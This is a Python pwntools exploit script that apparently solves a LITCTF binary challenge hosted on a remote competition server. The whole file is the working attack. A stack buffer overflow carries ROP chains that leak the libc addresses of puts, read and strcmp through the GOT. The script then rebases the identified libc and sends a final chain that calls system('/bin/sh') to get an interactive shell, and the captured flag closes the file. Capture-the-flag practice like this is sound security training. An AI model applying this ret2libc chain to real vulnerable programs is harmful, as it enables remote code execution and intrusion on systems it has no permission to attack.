from pwn import *

elf = context.binary = ELF("main")
# p = process()
p = remote("litctf.org",31779)

# gdb.attach(p)

rop = ROP(elf)

payload = flat([
    rop.rdi.address, 
    elf.got.puts,
    elf.plt.puts,
    elf.sym.main
])


# overflow and leak puts
p.sendlineafter(":",b"LITCTF" + p8(0) +  cyclic(33) + payload)
p.sendlineafter(":",b"d0nt_57r1ngs_m3_3b775884") 

p.recvuntil("Goodbye\n")
puts = u64(p.recvline().strip().ljust(8,p8(0)))
print("puts",hex(puts))


###################################################

# overflow and leak read
payload = flat([
    rop.rdi.address, 
    elf.got.read,
    elf.plt.puts,
    elf.sym.main
])

p.sendlineafter(":",b"LITCTF" + p8(0) +  cyclic(33) + payload)
p.sendlineafter(":",b"d0nt_57r1ngs_m3_3b775884") 

p.recvuntil("Goodbye\n")
read = u64(p.recvline().strip().ljust(8,p8(0)))
print("read",hex(read))


###################################################


# overflow and leak strcmp
payload = flat([
    rop.rdi.address, 
    elf.got.strcmp,
    elf.plt.puts,
    elf.sym.main
])

p.sendlineafter(":",b"LITCTF" + p8(0) +  cyclic(33) + payload)
p.sendlineafter(":",b"d0nt_57r1ngs_m3_3b775884") 

p.recvuntil("Goodbye\n")
strcmp = u64(p.recvline().strip().ljust(8,p8(0)))
print("strcmp",hex(strcmp))


###################################################



# get required libc and overflow to system

libc = ELF("libc6_2.39-0ubuntu8.4_amd64.so")
libc.address = puts - libc.sym.puts 
print("libc.address",hex(libc.address))
pop_rdi = libc.address + 0x000000000010f75b


rop = ROP(libc)
payload = flat([
    rop.rdi.address, 
    next(libc.search(b"/bin/sh\x00")),
    rop.ret.address, 
    libc.sym.system
])

p.sendlineafter(":",b"LITCTF" + p8(0) +  cyclic(33) + payload)
p.sendlineafter(":",b"d0nt_57r1ngs_m3_3b775884") 



p.interactive()


# LITCTF{s3cret_LIT_n3w5:_4ll_r3v_1s_pwn???}